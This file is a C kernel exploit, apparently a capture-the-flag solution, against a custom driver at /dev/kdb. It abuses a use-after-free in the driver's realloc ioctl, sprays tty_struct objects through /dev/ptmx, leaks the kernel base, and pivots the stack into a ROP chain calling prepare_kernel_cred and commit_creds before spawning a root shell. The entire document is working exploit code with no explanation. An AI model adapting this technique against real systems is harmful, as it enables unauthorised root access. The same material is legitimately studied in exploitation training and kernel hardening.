#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define BASE_REQUEST 0x13371338
#define NUM_SPRAY 0x100
#define BASE (0xffff880000000000ULL)

unsigned long long offset_commit_creds = 0xffffffff8103d3a0 - BASE;
unsigned long long offset_prepare_kernel_cred = 0xffffffff8103d1a0 - BASE;

unsigned long long offset_mov_esp_0xe58948c0_pop_rbp = 0xffffffff810e0747 - BASE;
unsigned long long offset_pop_rdi = 0xffffffff810a23cd - BASE;
unsigned long long offset_mov_rdi_rax_call_rdx = 0xffffffff8104f196 - BASE;
unsigned long long offset_pop_rdx = 0xffffffff81243618 - BASE; // Fails with NX bit not set panic
unsigned long long offset_pop_rdx_rbp = 0xffffffff8106c73c - BASE;
unsigned long long offset_swapgs = 0xffffffff8113e858 - BASE;
unsigned long long offset_iretq = 0xffffffff8113e030 - BASE;

unsigned long long addr_stack = 0xe58948c0;


unsigned long long user_cs;
unsigned long long user_rflags;
unsigned long long user_ss;
void save_state(void) {
    __asm__ volatile (
            "mov %0, cs\n\t"
            "pushf\n\t"
            "pop %1\n\t"
            "mov %2, ss\n\t"
            : "=r"(user_cs), "=r"(user_rflags), "=r"(user_ss)
            :
            : "memory"
            );
}


void shell(void) {
    system("/bin/sh");
}


void kdb_alloc(int fd, char *key, unsigned long long size) {
    char *arg = malloc(0x30);
    strncpy(arg, key, 0x20 - 1);
    *(unsigned long long *)(arg + 0x20) = size;
    ioctl(fd, BASE_REQUEST + 0x0, arg);
    free(arg);
}


void kdb_read(int fd, char *key, char *buf, unsigned long long size) {
    char *arg = malloc(0x30);
    strncpy(arg, key, 0x20 - 1);
    *(unsigned long long *)(arg + 0x20) = (unsigned long long)buf;
    *(unsigned long long *)(arg + 0x28) = (unsigned long long)size;
    ioctl(fd, BASE_REQUEST + 0x1, arg);
    free(arg);
}


void kdb_write(int fd, char *key, char *buf) {
    char *arg = malloc(0x30);
    strncpy(arg, key, 0x20 - 1);
    *(unsigned long long *)(arg + 0x20) = (unsigned long long)buf;
    ioctl(fd, BASE_REQUEST + 0x2, arg);
    free(arg);
}


void kdb_realloc(int fd, char *key, char *buf, unsigned long long size) {
    char *arg = malloc(0x30);
    strncpy(arg, key, 0x20 - 1);
    *(unsigned long long *)(arg + 0x20) = (unsigned long long)buf;
    *(unsigned long long *)(arg + 0x28) = size;
    ioctl(fd, BASE_REQUEST + 0x7, arg);
    free(arg);
}


int main(void) {
    int i, fd;
    int ptmx_fds[NUM_SPRAY];
    char buf[1024];
    unsigned long long tty_operations[0x20];
    char tty_struct[0x2e0];

    save_state();

    if ((fd = open("/dev/kdb", O_RDWR)) < 0) {
        perror("open");
        return 1;
    }
    puts("[+] Create kdb_node");
    kdb_alloc(fd, "A", 0x2e0);
    puts("[+] Create dangling pointer");
    kdb_realloc(fd, "A", buf, (-1LL) & ~0xffff);
    puts("[+] Spray heap with tty_struct");
    for (i = 0; i < NUM_SPRAY; ++i) {
        ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
    puts("[+] Leak address");
    kdb_read(fd, "A", buf, 1024);
    memcpy(tty_struct, buf, sizeof(tty_struct));
    unsigned long long data = *(unsigned long long *)(buf + 24);
    unsigned long long addr_base = data - 0x77ff8121bea0ULL;
    printf("[+] Leaked: 0x%llx\n", data);
    printf("[+] Kernel base address: 0x%llx\n", addr_base);
    // Prepare ROP payload
    void *addr_mmap = (void *)(addr_stack & (~0xfff));
    if (mmap(addr_mmap, 0x20000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0) != addr_mmap) {
        perror("mmap");
        return 1;
    }
    unsigned long long *stack = (unsigned long long *)addr_stack + 1;
    *stack ++= addr_base + offset_pop_rdi;
    *stack ++= 0ULL;
    *stack ++= addr_base + offset_prepare_kernel_cred;
    *stack ++= addr_base + offset_pop_rdx_rbp;
    *stack ++= addr_base + offset_commit_creds + 4;
    *stack ++= 0xdeadbeefULL;
    *stack ++= addr_base + offset_mov_rdi_rax_call_rdx;
    *stack ++= addr_base + offset_swapgs;
    *stack ++= addr_base + offset_iretq;
    *stack ++= (unsigned long long)shell;
    *stack ++= user_cs;
    *stack ++= user_rflags;
    *stack ++= (unsigned long long)addr_mmap + 0x5000;
    *stack ++= user_ss;
    // Write fake tty_struct with fake tty_operations
    tty_operations[12] = addr_base + offset_mov_esp_0xe58948c0_pop_rbp;
    *(unsigned long long *)(tty_struct + 24) = (unsigned long long)tty_operations;
    kdb_write(fd, "A", tty_struct);
    // Trigger
    for (i = 0; i < NUM_SPRAY; ++i) {
        ioctl(ptmx_fds[i], 0, 0);
    }

    return 0;
}
